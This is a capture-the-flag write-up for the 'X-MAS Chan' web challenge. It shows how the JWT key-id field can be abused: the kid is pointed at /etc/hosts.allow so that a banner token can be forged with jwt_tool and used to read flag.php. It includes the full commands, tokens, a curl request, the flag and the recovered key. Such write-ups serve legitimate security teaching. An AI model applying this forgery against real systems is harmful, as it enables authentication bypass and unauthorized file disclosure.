# X-MAS Chan (Web 470, 26 solves)

Basically the whole site is bait even though tinyboard is long dead. The only addition we can find is the suspicious get\_banner.php, which returns a signed JWT token with the banner path in it. Presumably if we can change the path the server will fetch the file for us.

We use JWT kid (key id) field abuse. The key is read from disk so we can use a known file to forge signature with [jwt\_tool](https://github.com/ticarpi/jwt_tool).

```
python3 jwt_tool.py eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiIsImtpZCI6IlwvdG1wXC9qd3Qua2V5In0.eyJiYW5uZXIiOiJiYW5uZXJcLzExLmdpZiJ9.oF8DELrjNtD05_4qOyI3wJqHUH_iM2xFvRRAU_tKGPU -k /etc/hosts.allow -T -S hs256
[...]
Current value of kid is: /tmp/jwt.key
Please enter new value and hit ENTER
> /etc/hosts.allow
[...]
Current value of banner is: banner/11.gif
Please enter new value and hit ENTER
> flag.php
[...]
Tampered token - HMAC Signing:
[+] eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiIsImtpZCI6Ii9ldGMvaG9zdHMuYWxsb3cifQ.eyJiYW5uZXIiOiJmbGFnLnBocCJ9.TKlW29olIFPhFJyDM-UBVUVMYQtcs6BU0nwY1XXDAUA

> curl -H "Cookie: banner=eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiIsImtpZCI6Ii9ldGMvaG9zdHMuYWxsb3cifQ.eyJiYW5uZXIiOiJmbGFnLnBocCJ9.TKlW29olIFPhFJyDM-UBVUVMYQtcs6BU0nwY1XXDAUA" http://challs.xmas.htsp.ro:3010/getbanner.php
```

Flag: `X-MAS{n3v3r_trust_y0ur_us3rs_k1ds-b72dcf5a49498400}`

We can fetch the key file now if we want: 6f617a19b176e3a79fe3f4853b07e39d164449d1b663b4535d1e24357330a150
